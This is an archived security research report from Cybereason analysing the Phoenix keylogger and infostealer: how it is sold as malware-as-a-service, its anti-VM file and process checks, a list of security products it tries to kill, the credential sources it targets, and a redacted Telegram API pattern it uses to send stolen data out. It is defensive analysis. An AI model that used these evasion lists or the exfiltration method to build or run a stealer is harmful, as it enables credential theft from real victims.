{
    "id": "2af84e03-bd22-452d-b616-b3fec5a28b65",
    "created_at": "2023-01-12T15:09:19.704758Z",
    "updated_at": "2025-03-27T02:11:33.899998Z",
    "deleted_at": null,
    "sha1_hash": "b864556d45ae7fc09b7e55656abe8666caf2da42",
    "title": "2019-11-20 - Phoenix- The Tale of the Resurrected Keylogger",
    "authors": "",
    "file_creation_date": "2022-05-27T23:10:15Z",
    "file_modification_date": "2022-05-27T23:10:15Z",
    "file_size": 2989688,
    "plain_text": "# Phoenix: The Tale of the Resurrected Keylogger\n\n**[cybereason.com/blog/phoenix-the-tale-of-the-resurrected-alpha-keylogger](https://www.cybereason.com/blog/phoenix-the-tale-of-the-resurrected-alpha-keylogger)**\n\n\n-----\n\nWritten By\nCybereason Nocturnus\n\nNovember 20, 2019 | 11 minute read\n\n**Research by: Assaf Dahan**\n\n## Introduction: Keylogger Malware\n\nCybereason’s Nocturnus team is tracking a new keylogger gaining traction among cybercriminals\ncalled Phoenix. The keylogger first emerged in July 2019 packed with a myriad of informationstealing features. These features extend beyond solely logging keystrokes, to the point where we\nare inclined to classify it as an infostealer.\n\nThis research explains several aspects of the Phoenix keylogger, including:\n\n1. A Look Into the Underground Community: The underground, ongoing marketing efforts to\n\npromote Phoenix and its reception in the underground community.\n2. A Technical Breakdown: A technical breakdown of the Phoenix keylogger, including info\n\nstealing capabilities, communication through Telegram, and potential persistence.\n3. The Connection to a Previous Keylogger: The discovery of the Phoenix keylogger’s\n\nconnection to the “orphaned” Alpha keylogger.\n\n## Key Findings\n\n\n-----\n\n**The Phoenix Keylogger: The Cybereason Nocturnus team is investigating multiple incidents**\nof a new, emerging keylogger called Phoenix, and is now able to provide details into the\nkeylogger’s operations and its creator.\n**Steals Data From Multiple Sources: Phoenix operates under a malware-as-a-service model**\nand steals personal data from almost 20 different browsers, four different mail clients, FTP\nclients, and chat clients.\n**Tries to Stop over 80 Security Products: On top of its information stealing features, Phoenix**\nhas several defensive and evasive mechanisms to avoid analysis and detection, including an\nAnti-AV module that tries to kill the processes of over 80 different security products and\nanalysis tools.\n**Targets Across Continents: Despite Phoenix having been released in July 2019, it has**\nalready targeted victims across North America, the United Kingdom, France, Germany and\nother parts of Europe and the Middle East. We expect more regions to be affected as it gains\npopularity.\n**Exfiltrates Data through Telegram: Phoenix offers common SMTP and FTP exfiltration**\n[protocols, but also supports data exfiltration over Telegram. Telegram, a popular chat](https://telegram.org/)\napplication worldwide, is leveraged by cybercriminals for its legitimacy and end-to-end\nencryption.\n**Has the Same Author as the Alpha Keylogger: Phoenix was clearly authored by the same**\nteam behind the Alpha keylogger, which disappeared earlier this year.\n**“Malware for the People”: This research showcases the ever-growing popularity of the**\nMalware-as-a-Service model in the cybercrime ecosystem. Malware authors are developing\nmalware that is easy for any user to operate and comes bundled with customer support and a\ncompetitive price point. As we move into 2020, we expect to see many less-technical\ncybercriminals leverage MaaS to commit cybercrime, especially as MaaS authors start to\ncompete for the most impressive offering.\n\nAdvanced endpoint protection platforms address these kinds of attacks. Learn about the future of\nEPPs during our webinar.\n\n## Background: Phoenix Keylogger\n\nAt the end of July 2019, the Cybereason platform detected a malware sample that was classified by\n[some antivirus vendors as Agent Tesla. Upon further review, however, it became clear that this was](https://krebsonsecurity.com/2018/10/who-is-agent-tesla/)\nnot Agent Tesla. We were able to determine this malware was a completely new and previously\nundocumented malware known as the Phoenix keylogger.\n\n\n-----\n\n_Phoenix MaaS Model Pricing_\n\n_Phoenix updated MaaS model pricing._\n\nIn searching underground communities, we learned that Phoenix first emerged at the end of July in\n2019. This keylogger follows the malware as a service (MaaS) model and is sold for $14.99-$25.00\nper month by a community member with the handle Illusion.\n\n\n-----\n\n_Illusion s Join Date (24/07/2019)_\n\nIllusion joined the underground community at the end of July 2019 and immediately began\nmarketing the keylogger. This behavior is somewhat unusual, as the underground community\ntypically enforces a strict vetting process for members.\n\n### Reception in the Underground Community\n\nShortly after its launch, the Phoenix keylogger caught the attention of the underground community,\nwith numerous members expressing interest in testing the product. The underground community\nviews Phoenix quite favorably because of its stealing capabilities, stability, easy user interface, and\ncustomer support.\n\n**Example #1: Extremely User Friendly with Documentation**\n\n_This cybercriminal’s review expresses how easy Phoenix is to use. The in-depth review discusses_\n_documentation, cost, password recovery, and more - all items that are crucial to maintaining any_\n_SaaS._\n\n**Example #2: Comes with a User Guide and Friendly**\n\n_This cybercriminal’s review expresses how Phoenix comes with a user guide and friendly customer_\n_support. Specifically, they state how the owner of Phoenix is more than willing to help users if they_\n_have questions._\n\n**Example #3: 101% Support to Customers**\n\n\n-----\n\n_Continued validation of the quality customer support the owner of Phoenix provides._\n\n_Illusion’s response to a request for features and recent updates to the changelog._\n\nReviews of the Phoenix keylogger draw a stark contrast with some MaaS products sold in hacker\nforums. They praise Illusion’s customer support and positive attitude toward the customer, as\nopposed to others in the underground community who view their customers solely as cash-cows.\n\nThese positive reviews suggest Phoenix’s potential for widespread use in the future. Like many\n[modern MaaS, Phoenix gives non-technical and technical users alike easy access to damaging and](https://www.cybereason.com/blog/hunting-raccoon-stealer-the-new-masked-bandit-on-the-block)\nexploitative software through the proverbial swipe of a credit card. Phoenix is further proof of our\nongoing belief that modern MaaS is creating a new group of cybercriminals that profit off of other,\nless technical cybercriminals.\n\nFurther, Phoenix shows how some cybercriminals are following many of the same methodologies as\nlegitimate software-as-a-service (SaaS) businesses: marketing efforts, relying on positive reviews,\nresponsive customer support, and regularly improving features in their product are hallmarks of a\nprofitable SaaS.\n\n## Malware Analysis\n\n### Malware Capabilities\n\nThe Phoenix keylogger is written in VB.NET.\n\nPhoenix has a host of features that extend far beyond keylogging, including:\n\nKeylogger + Clipboard Stealer\nScreen Capture\n\n\n-----\n\nPassword Stealing (Browsers, Mail Clients, FTP clients, Chat Clients)\nData exfiltration via SMTP, FTP or Telegram\nDownloader (to download additional malware)\nAlleged AV-Killer Module\nAnti-debugging and Anti-VM Features\n\n### Delivery Method\n\nBy default, Illusion supplies the Phoenix keylogger to their buyers as a stub. The buyer must use\ntheir own methods to deliver the stub to the target machine. The majority of Phoenix infections we\nobserve originate from phishing attempts that leverage a weaponized rich text file (RTF) or Microsoft\nOffice document. These deliveries do not use the more popular malicious macro technique, but\ninstead use known exploits. Most commonly, they exploit the Equation Editor vulnerability (CVE2017-11882).\n\n_Process tree of the Phoenix infection using a weaponized document._\n\n### Infected System Profiling\n\nOnce Phoenix successfully infects the target machine, it profiles the machine to gather information\non the operating system, hardware, running processes, users, and its external IP. Phoenix stores\nthe information in memory and sends it back to the attackers directly, without writing it to disk.\nAttackers commonly do this to be more stealthy, since it is harder to know what was exfiltrated if it is\nnot written to disk.\n\n\n-----\n\n_Example of system profiling data sent to the attackers._\n\n**Anti-Analysis & Anti-Detection Features**\n\nIt’s clear Illusion invested time and effort into protecting Phoenix, as the stub uses a few different\nmethods to protect itself from inspection.\n\n**String Encryption: Most critical strings used by the malware are encrypted and only**\ndecrypted in memory.\nObfuscation:The stub is obfuscated by what appears to be an implementation of the open\n[source ConfuserEx .NET obfuscator to hinder correct decompilation and code inspection.](https://github.com/yck1509/ConfuserEx/releases)\n\nIllusion recommends using an additional third-party crypter to “make it FUD”, or fully undetectable. It\nis worth noting that most Phoenix samples caught in the wild are packed with a crypter, but are still\nprevented by the majority of antivirus vendors.\n\nAfter obtaining basic system information, Phoenix checks to see if it is running in a “hostile”\nenvironment. A hostile environment can take different forms: if Phoenix is deployed in a virtual\nmachine, debugger, or on a machine with analysis tools or antivirus products installed. Phoenix has\na set of features to disable different Windows tools within the admin panel, like disabling CMD, the\nregistry, task manager, system restore, and others.\n\nIt is interesting to note that even though the user interface used by Phoenix’s operators seems to\nhave support for a persistence feature, most samples analyzed by Cybereason did not exhibit\npersistence behavior following a successful infection. A possible explanation to this can lie in the\nattackers’ wish to minimize the risk of over exposure. Once Phoenix obtained the necessary data,\nthere is no need for it to increase the risk of exposure by persisting longer than needed.\n\n\n-----\n\n_The Phoenix keylogger admin panel, with features to disable different tools._\n\nLet’s dive into some of the techniques Phoenix uses to detect a “hostile” environment.\n\nAnti-VM Module\n\nMost of Phoenix’s anti-VM checks are [based on known techniques. Given the checks used and their](https://www.cyberbit.com/blog/endpoint-security/anti-vm-and-anti-sandbox-explained/)\n[order, we believe they were most likely copy-pasted from the Cyberbit blog. Phoenix performs the](https://www.cyberbit.com/blog/endpoint-security/anti-vm-and-anti-sandbox-explained/)\nchecks and terminates itself if it discovers any of the following processes or files in the target\nmachine.\n\n_Phoenix checking for various running processes._\n\n\n-----\n\n**Checking for running processes:**\n\n_SandboxieRpcSs_\n_Vmtoolsd_\n_Vmwaretrat_\n_Vmwareuser_\n_Vmacthlp_\n_Vboxservice_\n_Vboxtray_\n**Checking for the existence of the following files:**\n\n_c:\\windows\\System32\\Drivers\\VBoxMouse.sys_\n_c:\\windows\\System32\\Drivers\\vm3dgl.dll_\n_c:\\windows\\System32\\Drivers\\vmtray.dll_\n_c:\\windows\\System32\\Drivers\\VMToolshook.dll_\n_c:\\windows\\System32\\Drivers\\vmmousever.dll_\n_c:\\windows\\System32\\Drivers\\VBoxGuest.sys_\n_c:\\windows\\System32\\Drivers\\VBoxSF.sys_\n_c:\\windows\\System32\\Drivers\\VBoxVideo.sys_\n_c:\\windows\\System32\\VBoxService.exe_\n\nDisabling Windows Defender\n\nPhoenix attempts to disable the Windows Defender AntiSpyware module by changing the following\nregistry key.\n\n_Phoenix attempts to disable Windows Defender Antispyware._\n\nAnti-AV Module\n\nPhoenix’s anti-AV module tries to terminate the process of a vast number of security products.\n\n_Phoenix terminating the process of different security products._\n\n_Security Products Phoenix Attempts to Terminate:_\n\n\n-----\n\nzlclient, egui, bdagent, npfmsg, olydbg, anubis, wireshark, avastui, _Avp32, vsmon, mbam,\nkeyscrambler, _Avpcc, _Avpm, Ackwin32, Outpost, Anti-Trojan, ANTIVIR, Apvxdwin, ATRACK,\nAutodown, Avconsol, Ave32, Avgctrl, Avkserv, Avnt, Avp, Avp32, Avpcc, Avpdos32, Avpm, Avptc32,\nAvpupd, Avsched32, AVSYNMGR, Avwin95, Avwupd32, Blackd, Blackice, Cfiadmin, Cfiaudit, Cfinet,\nCfinet32, Claw95, Claw95cf, Cleaner, Cleaner3, Defwatch, Dvp95, Dvp95_0, Ecengine, Esafe,\nEspwatch, F-Agnt95, Findviru, Fprot, F-Prot, F-Prot95, Fp-Win, Frw, F-Stopw, Iamapp, Iamserv,\nIbmasn, Ibmavsp, Icload95, Icloadnt, Icmon, Icsupp95, Icsuppnt, Iface, Iomon98, Jedi,\nLockdown2000, Lookout, Luall, MCAFEE, Moolive, Mpftray, N32scanw, NAVAPSVC, NAVAPW32,\nNAVLU32, Navnt, NAVRUNR, Navw32, Navwnt, NeoWatch, NISSERV, Nisum, Nmain, Normist,\nNORTON, Nupgrade, Nvc95, Outpost, Padmin, Pavcl, Pavsched, Pavw, PCCIOMON, PCCMAIN,\nPccwin98, Pcfwallicon, Persfw, POP3TRAP, PVIEW95, Rav7, Rav7win, Rescue, Safeweb, Scan32,\nScan95, Scanpm, Scrscan, Serv95, Smc, SMCSERVICE, Snort, Sphinx, Sweep95,\nSYMPROXYSVC, Tbscan, Tca, Tds2-98, Tds2-Nt, TermiNET, Vet95, Vettray, Vscan40, Vsecomr,\nVshwin32, Vsstat, Webscanx, WEBTRAP, Wfindv32, Zonealarm, LOCKDOWN2000, RESCUE32,\nLUCOMSERVER, avgcc, avgcc, avgamsvr, avgupsvc, avgw, avgcc32, avgserv, avgserv9,\navgserv9schedapp, avgemc, ashwebsv, ashdisp, ashmaisv, ashserv, aswUpdSv, symwsc, norton,\nNorton Auto-Protect, norton_av, nortonav, ccsetmgr, ccevtmgr, avadmin, avcenter, avgnt, avguard,\navnotify, avscan, guardgui, nod32krn, nod32kui, clamscan, clamTray, clamWin, freshclam, oladdin,\nsigtool, w9xpopen, Wclose, cmgrdian, alogserv, mcshield, vshwin32, avconsol, vsstat, avsynmgr,\navcmd, avconfig, licmgr, sched, preupd, MsMpEng, MSASCui, Avira.Systray\n\n### Phoenix’s Core Stealing Functionality\n\nOnce Phoenix finishes checking for a hostile environment, it executes several different stealing\nmodules.\n\n**Credential Stealing**\n\nPhoenix attempts to steal credentials and other sensitive information stored locally on the target\nmachine by searching for specific files or registry keys that contain sensitive information. It searches\nbrowsers, mail clients, FTP clients, and chat clients.\n\n**Browsers**\n\nChrome, Firefox, Opera, Vivaldi, Brave, Blisk, Epic, Avast browser, SRware Iron, Comodo, Torch,\nSlimjet, UC browser, Orbitum, Coc Coc, QQ Browser, 360 Browser, Liebao\n\n**Mail Clients**\n\nOutlook, Thunderbird, Seamonkey, Foxmail\n\n**FTP Client**\n\nFilezilla\n\n**Chat Clients**\n\nPidgin\n\n\n-----\n\n_Excerpt from Phoenix’s Outlook module_\n\n_Excerpt from Phoenix’s Pidgin module_\n\n**Keylogger Module**\n\nPhoenix uses a common method of hooking keyboard events for its keylogging. It uses a Windows\nAPI function [SetWindowsHookExA to map the pressed keys, then matches them to the](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)\ncorresponding process.\n\n_Excerpt from Phoenix’s keylogger hooking function._\n\n\n-----\n\n_Phoenix keylogger functionality matching keystrokes to the relevant process._\n\n### Network & C2 Communication\n\nPhoenix checks for Internet connectivity and obtains the external IP address of the target machine\nby sending a GET HTTP request to [ifconfig.me, a known Internet service. This service gives](https://ifconfig.me/)\nPhoenix the external IP address of the target machine, or terminates itself if there is no Internet\nconnectivity.\n\n_Phoenix determines the external IP of an infected machine using a legitimate web service_\n\nPhoenix can post stolen data in cleartext over SMTP, FTP, or Telegram.\n\n**SMTP Communication & Exfiltration**\n\nFor the majority of cases, Phoenix posts the stolen data using the SMTP protocol. The stolen data is\nsent as an email to an email address controlled by the attacker.\n\n\n-----\n\n_Stolen browser data exfiltrated as an email message_\n\n**Telegram Communication & Exfiltration**\n\nAlternatively, in some cases Phoenix exfiltrates data by abusing the API of the popular Telegram\nchat application. This method of exfiltration is quite stealthy, since it abuses Telegram’s legitimate\n[infrastructure. Other malware have also started to use this technique, including the Masad Stealer.](https://forums.juniper.net/t5/Threat-Research/Masad-Stealer-Exfiltrating-using-Telegram/ba-p/468559)\n\nPhoenix sends an HTTP request to Telegram’s chat bot. This request includes the Telegram API\nkey, chat ID, and the stolen data is passed through the text parameter in URL encoding.\n\nHTTP request sent to Telegram’s API extracted from memory.\n\n\n-----\n\n```\nhttps://api[.]telegram[.]org/bot[ID]:[API_Token]/sendMessage?chat_id [ID]&text\n[URL_ENCODED_TEXT]\n\n```\n_Telegram HTTP request pattern used by Phoenix_\n\n_URL decoded text posted to a Telegram bot._\n\nThe Telegram bot responds with the following details:\n```\n{\"ok\":true,\"result\":{\"message_id\":[redacted],\"from\":{\"id\":\n[redacted],\"is_bot\":true,\"first_name\":\"[redacted]\",\"username\":\"[redacted]\"},\"chat\":{\"id\":\n[redacted],\"first_name\":\"[redacted]\",\"last_name\":\"[redacted]\",\"type\":\"private\"},\"date\":\n[redacted],\"text\":\"}\n\n```\nThe stolen data is passed through Telegram, allowing the user to leverage a legitimate application\nfor malicious communication and exfiltration.\n\n### Additional Communication with the C2 Server\n\nAt its current stage of development, Phoenix does not seem to use a standard, interactive C2\nmodel. Specifically, it doesn’t expect to receive commands back from the C2 server. Phoenix’s\nvarious tasks like infostealing, downloading additional malware, and spreading via USB are\npredefined by the operators in the configuration file before compilation. Phoenix uses a predefined\nexfiltration method from the configuration file to steal any collected data on execution.\n\n## Connecting to Alpha Keylogger\n\nDuring our investigation, we discovered the Phoenix keylogger is actually an evolution of an earlier\nproject, Alpha keylogger. We believe the Alpha keylogger was authored by the same team behind\nthe Phoenix keylogger.\n\n### Code Similarity Between Alpha and Phoenix Keylogger\n\nIn order to investigate deeper, we used YARA rules and other methods to retrieve additional\nsamples of Phoenix. One of the samples we retrieved was almost identical to Phoenix, with some\nparts copy-pasted with the same naming conventions, parameter names, and more. However, the\nname of the malware as it appeared in logs and in code was consistently Alpha keylogger\n\n\n-----\n\n**Similarities Between INFO Schemes**\n\n_Alpha Keylogger Client INFO Scheme_\n\n_Phoenix Keylogger Client INFO Scheme_\n\n**Similarities Between SMTP Configurations**\n\n_Phoenix Keylogger SMTP Configuration_\n\n\n-----\n\n_Alpha Keylogger SMTP Configuration_\n\n**Similarities Between SMTP FUNCTIONS**\n\n_Phoenix Keylogger SMTP Function_\n\n_Alpha Keylogger SMTP Function_\n\n**Similarities Between SELF-TERMINATION FUNCTIONS**\n\n\n-----\n\n_Phoenix Keylogger Self-termination Function_\n\n_Alpha Keylogger Self-termination Function_\n\n### Alpha Keylogger Overview\n\nIn searching the underground communities, we found references to the Alpha keylogger beginning\nas early as April of 2019. At that time, member Alpha_Coder and later, member AK_Generation,\nbegan marketing the keylogger to the underground community.\n\n_Alpha keylogger launched in April 2019 by Alpha_Coder._\n\nIn reviewing Alpha_Coder’s marketing materials, it is clear the two keyloggers are linked. They\nshare the exact same features, and the description of the features uses the exact same phrasing\nand even font.\n\n\n-----\n\n_Phoenix Keylogger Marketing_\n\n_Alpha Keylogger Marketing_\n\nIn addition, the design of the admin panel for the Alpha keylogger is very similar to the design of the\nadmin panel for the Phoenix keylogger.\n\n\n-----\n\n_Alpha Keylogger Admin Panel_\n\n_Phoenix Keylogger Admin Panel_\n\n### Disappearance of Alpha, Emergence of Phoenix\n\n\n-----\n\nIn the beginning of July 2019, the two members responsible for marketing the Alpha keylogger went\ncompletely silent. This happened just before the emergence of the Phoenix keylogger at the end of\nJuly 2019.\n\n_The last message by Alpha_Coder from the beginning of July 2019._\n\n_A potential buyer wonders whether the Alpha keylogger is still available._\n\nWhile it is not completely clear why the Alpha keylogger was abruptly shut down, chatter in the\nselling thread gives away potential clues. Alpha_Coder was banned from posting in the forum for\none month, for reasons unknown. During that time, AK_Generation led marketing efforts for the\nAlpha keylogger.\n\n_AK Generation marketing the Alpha keylogger_\n\n\n-----\n\nAK_Generation was created on April 27, 2019, the same day the Alpha keylogger was first\npromoted by Alpha_Coder. Interestingly, AK_Generation also disappeared close to the launch date\nof the Phoenix keylogger. It is likely that Alpha_Coder and AK_Generation are operated by the\nsame person, and that AK_Generation was created as a backup account for Alpha_Coder.\n\n_The last time AK_Generation was seen on the underground community._\n\nWe believe the Phoenix keylogger is not just an evolution of the Alpha keylogger, but also an\nattempt to rebrand and give the author a clean slate in the underground community.\n\n## Conclusion\n\nThis research breaks down the Phoenix keylogger, an information stealer operating under a\nmalware-as-a-service model, currently under active development. Since its emergence in late July\n2019, it has gained popularity in the underground community because of its ease of use,\ncompetitive pricing, and personal customer support.\n\nPhoenix is more than just a keylogger, with broad information-stealing capabilities, self-defense\nmechanisms, which include an anti-AV module that attempts to stop over 80 security products, and\nthe ability to exfiltrate data through Telegram. The majority of samples we identified in the wild do\nnot implement a persistence mechanism, nor do they interact bidirectionally with the C2 server.\nInstead, the stolen data is posted to a pre-configured exfiltration method, which suggests Phoenix is\nbeing used mostly as a “set it and forget it” type of malware.\n\n\n-----\n\nBased on our analysis, Phoenix s malware-as-a-service model appeals to a broad range of\ncybercriminals, particularly the less sophisticated who do not possess the technical know-how to\ndevelop their own successful malware infrastructure. This signals a continued trend of\ncybercriminals following the malware-as-a-service model to make malware accessible for any level\nuser. Malware authors are starting to use many of the same methodologies as legitimate softwareas-a-service businesses, including marketing their software, personalized customer support, and an\neasy user interface to continuously profit off of other, less technical cybercriminals.\n\nMoving into 2020, we expect a proliferation of less-technical cybercriminals to leverage MaaS to\ntarget, steal, and harm individuals, particularly as MaaS authors add additional features to their\nofferings.\n\nWant to hunt for these kind of threats? Check out our webinar to learn more about how to threat\nhunt.\n\n## INDICATORS OF COMPROMISE\n\nFind the [indicators of compromise for this attack here.](https://www.cybereason.com/hubfs/Indicators%20of%20Compromise/Phoenix%20Keylogger%20-%20Indicators%20of%20Compromise.pdf)\n\n## MITRE ATT&CK TECHNIQUES BREAKDOWN\n\n\n**Initial**\n**Access**\n\n**Spear**\n**[Phishing](https://attack.mitre.org/techniques/T1193/)**\n**Attachment**\n\n\n**Execution** **Defense**\n**Evasion**\n\n\n**Execution**\n**[through](https://attack.mitre.org/techniques/T1106/)**\n**API**\n\n**Command-**\n**Line**\n**Interface**\n\n\n**Discovery** **Collection** **Command**\n**and**\n**Control**\n\n\n**System Time**\n**Discovery**\n\n**Account**\n**Discovery**\n\n**File and**\n**[Directory](https://attack.mitre.org/techniques/T1083/)**\n**Discovery**\n\n**System**\n**[Information](https://attack.mitre.org/techniques/T1082/)**\n**Discovery**\n\n**Query**\n**Registry**\n\n\n**Software**\n**Packing**\n\n**Deobfuscate**\n**/ Decode**\n**Files or**\n**Information**\n\n**Obfuscated**\n**[Files or](https://attack.mitre.org/techniques/T1027/)**\n**Information**\n\n\n**Credential**\n**Access**\n\n**Credentials**\n**[from Web](https://attack.mitre.org/techniques/T1503/)**\n**Browsers**\n\n**Credentials**\n**in Files**\n\n**Input**\n**Capture**\n\n\n**Data from**\n**[Local](https://attack.mitre.org/techniques/T1005/)**\n**System**\n\n**Screen**\n**Capture**\n\n\n**Remote**\n**File Copy**\n\n**Web**\n**Service**\n\n\n-----\n\n**Process**\n**Discovery**\n\n**System**\n**[Owner/User](https://attack.mitre.org/techniques/T1033/)**\n**Discovery**\n\n**System**\n**Network**\n**Configuration**\n**Discovery**\n\nAbout the Author\n\n**Cybereason Nocturnus**\n\nThe Cybereason Nocturnus Team has brought the world’s brightest minds from the military,\ngovernment intelligence, and enterprise security to uncover emerging threats across the globe.\nThey specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing\nunknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a\nvaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.\n\n[All Posts by Cybereason Nocturnus](https://www.cybereason.com/blog/authors/cybereason-nocturnus)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-11-20 - Phoenix- The Tale of the Resurrected Keylogger.pdf"
    ],
    "report_names": [
        "2019-11-20 - Phoenix- The Tale of the Resurrected Keylogger.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e90ec9cb-9959-455d-b558-4bafef64d645",
            "created_at": "2022-10-25T16:07:24.222081Z",
            "updated_at": "2025-03-27T02:02:10.14365Z",
            "deleted_at": null,
            "main_name": "Sphinx",
            "aliases": [
                "APT-C-15"
            ],
            "source_name": "ETDA:Sphinx",
            "tools": [
                "AnubisSpy",
                "Backdoor.Oldrea",
                "Bladabindi",
                "Fertger",
                "Havex",
                "Havex RAT",
                "Jorik",
                "Oldrea",
                "PEACEPIPE",
                "njRAT",
                "yellowalbatross"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536159,
    "ts_updated_at": 1743041493,
    "ts_creation_date": 1653693015,
    "ts_modification_date": 1653693015,
    "files": {
        "pdf": "https://archive.orkl.eu/b864556d45ae7fc09b7e55656abe8666caf2da42.pdf",
        "text": "https://archive.orkl.eu/b864556d45ae7fc09b7e55656abe8666caf2da42.txt",
        "img": "https://archive.orkl.eu/b864556d45ae7fc09b7e55656abe8666caf2da42.jpg"
    }
}